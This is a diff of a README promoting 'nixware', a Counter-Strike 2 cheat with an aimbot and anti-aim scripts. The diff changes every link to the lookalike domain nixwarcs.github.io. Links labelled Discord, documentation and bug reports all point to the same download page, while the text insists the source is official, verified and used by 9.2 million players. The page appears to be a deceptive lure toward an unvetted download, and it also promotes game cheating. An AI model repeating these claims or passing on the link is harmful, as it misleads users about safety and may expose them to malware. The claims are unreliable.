@@ -4,7 +4,7 @@
 
 Welcome to the **official** nixware repository — the most trusted, verified, and feature-rich CS2 enhancement platform used by over 9.2 million players worldwide. Nixware delivers a stable, authentic, and secure experience with every official release, combining cutting-edge AI targeting, advanced nixware cfg management, and a robust nixware api cs2 integration layer. Whether you're tuning your nixware aimbot config, scripting nixware anti aim lua routines, or dominating with nixware hvh presets, this is the one legitimate source you need.
 
-[![Download Nixware](https://img.shields.io/badge/DOWNLOAD%20NIXWARE%20v6.8.4-NOW-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://nixwarecs.github.io/nixware/)
+[![Download Nixware](https://img.shields.io/badge/DOWNLOAD%20NIXWARE%20v6.8.4-NOW-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://nixwarcs.github.io/nixware/) 
 
 ---
 
@@ -75,7 +75,7 @@ Downloading the official nixware app delivers measurable, legitimate advantages 
 
 ## 📥 How to Download
 
-[Download Nixware v6.8.4](https://nixwarecs.github.io/nixware/)
+[Download Nixware v6.8.4](https://nixwarcs.github.io/nixware/)
 
 The official nixware build `#71293` (release date: October 14, 2026) is available for all 4 supported platforms directly from the trusted page above. This is the only authentic, legitimate nixware download source. Never retrieve nixware from a third-party site — unauthorized files are not verified or certified by the official nixware team, and their safety cannot be guaranteed.
 
@@ -298,11 +298,11 @@ Whether you're running nixware dm sessions to sharpen your aim, deploying nixwar
 
 ## 🌐 Community & Links
 
-* 💬 **Discord:** [Join the Official Nixware Community Server](https://nixwarecs.github.io/nixware/)
-* 📦 **Download:** [Official Nixware GitHub Releases](https://nixwarecs.github.io/nixware/)
-* 📘 **API Docs:** [View the Official Nixware Documentation](https://nixwarecs.github.io/nixware/)
-* 🐛 **Report a Bug:** [Open an Issue on the Official Nixware Repo](https://nixwarecs.github.io/nixware/)
-* ⭐ **Star the repo** to [support the official nixware project](https://nixwarecs.github.io/nixware/)!
+* 💬 **Discord:** [Join the Official Nixware Community Server](https://nixwarcs.github.io/nixware/)
+* 📦 **Download:** [Official Nixware GitHub Releases](https://nixwarcs.github.io/nixware/)
+* 📘 **API Docs:** [View the Official Nixware Documentation](https://nixwarcs.github.io/nixware/)
+* 🐛 **Report a Bug:** [Open an Issue on the Official Nixware Repo](https://nixwarcs.github.io/nixware/)
+* ⭐ **Star the repo** to [support the official nixware project](https://nixwarcs.github.io/nixware/)!
 
 ---
 
